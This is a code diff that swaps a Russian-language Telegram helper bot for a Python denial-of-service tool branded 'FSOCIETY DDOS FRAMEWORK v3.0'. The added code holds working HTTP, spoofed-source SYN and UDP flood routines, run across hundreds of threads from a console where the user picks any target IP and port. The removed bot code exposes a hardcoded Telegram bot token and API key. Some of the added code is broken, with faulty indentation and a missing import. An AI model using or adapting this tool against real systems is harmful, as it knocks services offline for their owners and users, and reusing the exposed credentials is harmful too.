@@ -1,147 +1,180 @@
-import logging
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
-import requests
 
-# Настройки
-TOKEN = "7861189824:AAHJYqds-yFSL62CUld2rNjYmFQs3rnHq1M"
-OPENWEATHER_API_KEY = "a4d59bf0f52e6de1b4f17e4efc7e7a29"
-EXCHANGE_RATE_API = "https://api.exchangerate-api.com/v4/latest/USD"
+# -*- coding: utf-8 -*-
+# DDOS FSOCIETY BY XELS v3.0
+import socket
+import threading
+import random
+import time
+import sys
+from scapy.all import *
 
-# Настройка логгирования
-logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+# ███████╗███████╗ ██████╗ ██████╗ ██╗████████╗██╗   ██╗
+# ██╔════╝██╔════╝██╔═══██╗██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
+# █████╗  ███████╗██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
+# ██╔══╝  ╚════██║██║   ██║██╔═══╝ ██║   ██║     ╚██╔╝  
+# ██║     ███████║╚██████╔╝██║     ██║   ██║      ██║   
+# ╚═╝     ╚══════╝ ╚═════╝ ╚═╝     ╚═╝   ╚═╝      ╚═╝   
 
-# Глобальная переменная для задач (в реальном проекте используйте БД)
-user_tasks = {}
+class FSocietyDDoS:
+    def __init__(self):
+        self.attack_active = False
+        self.threads = []
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1"
+        ]
+        self.target_ip = ""
+        self.target_port = 80
+        self.attack_time = 60
+        self.thread_count = 500
 
-# Команда /start
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    await update.message.reply_html(
-        f"Привет, {user.mention_html()}! Я полезный бот 🤖\n"
-        "Доступные команды:\n"
-        "/weather <город> - погода\n"
-        "/convert <сумма> <из валюты> <в валюту>\n"
-        "/addtask <текст> - добавить задачу\n"
-        "/tasks - список задач\n"
-        "/deltask <номер> - удалить задачу"
-    )
+    def show_banner(self):
+        print(r"""
+        ░▐█▀█▄▄▀▀█▄░▐██▀▀▀▀██▄██▀▀▀▀██▄░▐█▄░▄█▌
+        ░▐█▄▀▀▀▄▀▀▀░░▀▀██▄██▀░▀▀██▄██▀░▐█▀██▀█▌
+        ░▐█▄▄▄▄▄▄█▀░░░░▀▀██▀▀░░░░▀▀██▀▀░▐█▒█▒█░▌
+        """)
+        print("FSOCIETY DDOS FRAMEWORK v3.0")
+        print("Type 'help' for commands\n")
 
-# Погода через OpenWeather API
-async def weather(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        city = " ".join(context.args)
-        if not city:
-            await update.message.reply_text("Укажите город: /weather Москва")
-            return
+    def http_flood(self):
+        while self.attack_active:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((self.target_ip, self.target_port))
+                s.settimeout(1)
+                
+                # Создание HTTP-запроса
+                request = f"GET /?{random.randint(0, 65535)} HTTP/1.1\r\n"
+                request += f"Host: {self.target_ip}\r\n"
+                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
+                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
+                request += "Connection: keep-alive\r\n\r\n"
+                
+                s.send(request.encode())
+                s.close()
+            except:
+                pass
+
+    def syn_flood(self):
+    while self.attack_active:
+        try:
+            # Генерация случайных IP (ИСПРАВЛЕННАЯ ВЕРСИЯ)
+            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
+            
+            # Создание SYN пакета
+            ip_layer = IP(src=src_ip, dst=self.target_ip)
+            tcp_layer = TCP(sport=random.randint(1024, 65535), dport=self.target_port, flags="S")
+            packet = ip_layer / tcp_layer
+            
+            send(packet, verbose=0)
+        except:
+            pass
+
+    def udp_flood(self):
+        while self.attack_active:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                bytes = random._urandom(1024)
+                s.sendto(bytes, (self.target_ip, self.target_port))
+                s.close()
+            except:
+                pass
+
+    def start_attack(self, method):
+        self.attack_active = True
         
-        url = f"http://api.openweathermap.org/data/2.5/weather?q={city}&appid={OPENWEATHER_API_KEY}&units=metric&lang=ru"
-        response = requests.get(url).json()
+        # Выбор метода атаки
+        attack_method = self.http_flood
+        if method == "syn":
+            attack_method = self.syn_flood
+        elif method == "udp":
+            attack_method = self.udp_flood
         
-        if response["cod"] != 200:
-            await update.message.reply_text("Город не найден 😢")
-            return
+        # Запуск потоков
+        for _ in range(self.thread_count):
+            t = threading.Thread(target=attack_method)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
         
-        weather_data = response["weather"][0]
-        main_data = response["main"]
-        result = (
-            f"🌡 Погода в {city}:\n"
-            f"Температура: {main_data['temp']}°C (ощущается как {main_data['feels_like']}°C)\n"
-            f"Описание: {weather_data['description'].capitalize()}\n"
-            f"Влажность: {main_data['humidity']}%\n"
-            f"Ветер: {response['wind']['speed']} м/с"
-        )
-        await update.message.reply_text(result)
-    
-    except Exception as e:
-        logger.error(e)
-        await update.message.reply_text("Ошибка запроса 😢")
+        print(f"[+] Атака начата на {self.target_ip}:{self.target_port}")
+        print(f"[+] Метод: {method.upper()} | Потоки: {self.thread_count} | Время: {self.attack_time}сек")
+        
+        # Таймер атаки
+        time.sleep(self.attack_time)
+        self.stop_attack()
 
-# Конвертер валют
-async def convert(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        args = context.args
-        if len(args) < 3:
-            await update.message.reply_text("Используйте: /convert 100 USD RUB")
-            return
-        
-        amount = float(args[0])
-        from_cur = args[1].upper()
-        to_cur = args[2].upper()
-        
-        response = requests.get(EXCHANGE_RATE_API).json()
-        rates = response["rates"]
-        
-        if from_cur not in rates or to_cur not in rates:
-            await update.message.reply_text("Неверные коды валют (используйте USD, EUR, RUB и т.д.)")
-            return
-        
-        result = amount * (rates[to_cur] / rates[from_cur])
-        await update.message.reply_text(
-            f"💱 Результат:\n"
-            f"{amount:.2f} {from_cur} = {result:.2f} {to_cur}"
-        )
-    
-    except Exception as e:
-        logger.error(e)
-        await update.message.reply_text("Ошибка конвертации. Проверьте формат ввода")
+    def stop_attack(self):
+        self.attack_active = False
+        print("\n[!] Атака остановлена")
+        for t in self.threads:
+            t.join()
+        self.threads = []
 
-# Менеджер задач
-async def add_task(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    task = " ".join(context.args)
-    
-    if not task:
-        await update.message.reply_text("Укажите задачу: /addtask Купить молоко")
-        return
-    
-    if user_id not in user_tasks:
-        user_tasks[user_id] = []
-    
-    user_tasks[user_id].append(task)
-    await update.message.reply_text(f"✅ Задача добавлена: {task}")
-
-async def list_tasks(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    tasks = user_tasks.get(user_id, [])
-    
-    if not tasks:
-        await update.message.reply_text("Список задач пуст!")
-        return
-    
-    tasks_list = "\n".join([f"{i+1}. {task}" for i, task in enumerate(tasks)])
-    await update.message.reply_text(f"📝 Ваши задачи:\n{tasks_list}")
-
-async def delete_task(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    try:
-        task_num = int(context.args[0]) - 1
-        task = user_tasks[user_id].pop(task_num)
-        await update.message.reply_text(f"❌ Задача удалена: {task}")
-    except (IndexError, ValueError):
-        await update.message.reply_text("Укажите номер задачи: /deltask 1")
-    except KeyError:
-        await update.message.reply_text("Нет задач для удаления")
-
-# Запуск бота
-def main():
-    application = Application.builder().token(TOKEN).build()
-    
-    # Регистрация команд
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("weather", weather))
-    application.add_handler(CommandHandler("convert", convert))
-    application.add_handler(CommandHandler("addtask", add_task))
-    application.add_handler(CommandHandler("tasks", list_tasks))
-    application.add_handler(CommandHandler("deltask", delete_task))
-    
-    # Запуск
-    application.run_polling()
+    def console(self):
+        self.show_banner()
+        while True:
+            cmd = input("fsociety> ").strip().lower()
+            
+            if cmd == "exit":
+                sys.exit(0)
+                
+            elif cmd == "help":
+                print("\nКоманды:")
+                print("  target <IP> [PORT] - Установить цель")
+                print("  time <SECONDS>     - Время атаки")
+                print("  threads <COUNT>    - Количество потоков")
+                print("  http               - HTTP Flood атака")
+                print("  syn                - SYN Flood атака")
+                print("  udp                - UDP Flood атака")
+                print("  stop               - Остановить атаку")
+                print("  exit               - Выход\n")
+                
+            elif cmd.startswith("target"):
+                try:
+                    parts = cmd.split()
+                    self.target_ip = parts[1]
+                    if len(parts) > 2:
+                        self.target_port = int(parts[2])
+                    print(f"[+] Цель установлена: {self.target_ip}:{self.target_port}")
+                except:
+                    print("[!] Ошибка. Используйте: target <IP> [PORT]")
+                    
+            elif cmd.startswith("time"):
+                try:
+                    self.attack_time = int(cmd.split()[1])
+                    print(f"[+] Время атаки: {self.attack_time} секунд")
+                except:
+                    print("[!] Ошибка. Используйте: time <SECONDS>")
+                    
+            elif cmd.startswith("threads"):
+                try:
+                    self.thread_count = int(cmd.split()[1])
+                    print(f"[+] Потоки: {self.thread_count}")
+                except:
+                    print("[!] Ошибка. Используйте: threads <COUNT>")
+                    
+            elif cmd in ["http", "syn", "udp"]:
+                if not self.target_ip:
+                    print("[!] Сначала установите цель!")
+                    continue
+                self.start_attack(cmd)
+                
+            elif cmd == "stop":
+                self.stop_attack()
+                
+            else:
+                print("[!] Неизвестная команда. Введите 'help'")
 
 if __name__ == "__main__":
-    main()
-    p
+    try:
+        # Проверка прав (для SYN flood)
+        if os.name == 'posix' and os.geteuid() != 0:
+            print("[!] Требуются права root для SYN flood!")
+        
+        tool = FSocietyDDoS()
+        tool.console()
+    except KeyboardInterrupt:
+        print("\n[!] Работа завершена")
+        sys.exit(0)
